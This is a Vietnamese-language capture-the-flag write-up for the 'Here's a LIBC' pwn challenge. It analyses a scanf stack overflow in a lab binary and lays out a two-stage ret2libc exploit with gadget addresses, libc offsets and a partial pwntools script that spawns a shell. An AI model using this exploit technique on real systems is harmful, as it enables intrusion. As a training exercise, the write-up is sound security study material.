# Here's a LIBC (CyLab / picoCTF — Pwn, difficulty 3)

## Đề bài / file đính kèm
- CyLab id **179** (`vuln` + `libc.so.6` + Makefile). `nc xebec.cylabacademy.net 48281`.
- 64-bit x86-64, **non-PIE (0x400000)**, **no canary**, NX, Partial RELRO, `RUNPATH=./`.
- libc kèm: **Ubuntu GLIBC 2.27-3ubuntu1.2**.
- Chạy local: loader hệ thống mới không tương thích libc 2.27 → mượn `ld-2.27.so` và chạy `./ld-2.27.so --library-path . ./vuln`.

## Recon
- `do_stuff()`: `scanf("%[^\n]", buf)` **không giới hạn độ rộng** → overflow. Sau đó `scanf("%c", ...)` đọc nốt `\n`.
  - `buf`@`rbp-0x80`; saved rbp@`rbp`; ret@`rbp+8` ⇒ `buf→ret = 0x88 = 136`.
  - Vòng `for i in 0..0x63: buf[i]=convert_case(buf[i],i)` chỉ biến đổi **byte 0..99** → saved rbp/ret (offset ≥ 128) **không bị sửa**. Chỉ cần filler trong 100 byte đầu (không quan trọng vì là rác).
- `%[^\n]` dừng ở `\n` ⇒ **payload không được chứa byte `0x0a`** (kiểm tra mọi địa chỉ gadget/libc).
- Trước `leave;ret`, `do_stuff` gọi `puts(buf)` → payload bị "echo" (dừng ở NUL đầu tiên); chỉ là nhiễu.

## Lỗ hổng phát hiện
- Unbounded `scanf("%[^\n]")` vào stack buffer 128 byte ⇒ classic **ret2libc**.

## Kỹ thuật khai thác
- Gadget (non-PIE): `pop rdi ; ret` = `0x400913`, `ret` = `0x40052e`, `puts@plt` = `0x400540`, `GOT[puts]` = `0x601018`, `do_stuff` = `0x4006d8`.
- **Stage 1 (leak)**: `"A"*136 + p64(pop_rdi) + p64(GOT[puts]) + p64(puts@plt) + p64(do_stuff)`
  → `puts` in địa chỉ libc của `puts` (6 byte do byte thứ 7 là NUL) rồi quay lại `do_stuff`.
  Echo trước đó in `"A"*136` (byte 0..99 bị `convert_case` đổi case) + vài byte gadget tới NUL ⇒ phải bỏ dòng echo.
- `libc_base = puts_leak - 0x80a30`; `system = +0x4f4e0`; `"/bin/sh" = +0x1b40fa`.
- **Stage 2 (shell)**: `"A"*136 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)` → `system("/bin/sh")` (`ret` thêm vào để căn chỉnh 16 byte cho `system`).
- Parse leak theo **dòng** (`recvline`), không theo ký tự.

## Exploit script
Xem file [exploit.py](exploit.py).

```python
from pwn import *

context.arch = 'amd64'

POP_RDI = 0x400913
RET = 0x40052e
PUTS_PLT = 0x400540
PUTS_GOT = 0x601018
DO_STUFF = 0x4006d8

# Stage 1: Leak libc
payload1 = b"A" * 136 + p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(DO_STUFF)
# Stage 2: Ret2libc với 16-byte stack alignment
payload2 = b"A" * 136 + p64(RET) + p64(POP_RDI) + p64(binsh) + p64(system)
```

## Flag
`academy{redacted}`

## Bài học / pattern để tái sử dụng
- **`scanf("%[^\n]")`** = overflow không cần `gets`; nhưng **payload không được chứa `\n`**.
- **Loop `convert_case` chỉ đụng byte đầu**: khi vùng ghi đè (saved rbp/ret) nằm ngoài phạm vi loop thì vô hại.
- **Chạy local với libc cũ (2.27)**: loader hệ thống mới (2.39) báo `_dl_call_libc_early_init Assertion` → mượn `ld-2.27.so` tương ứng (`./ld-2.27.so --library-path . ./vuln`).
- **ret2puts leak → ret2libc** trong cùng 1 kết nối bằng cách quay lại `do_stuff`/`main` cho stage 2.
- **X64 ret2libc cần căn chỉnh stack**: chèn `ret` trước `system`/`one_gadget` nếu crash tại `movaps`.
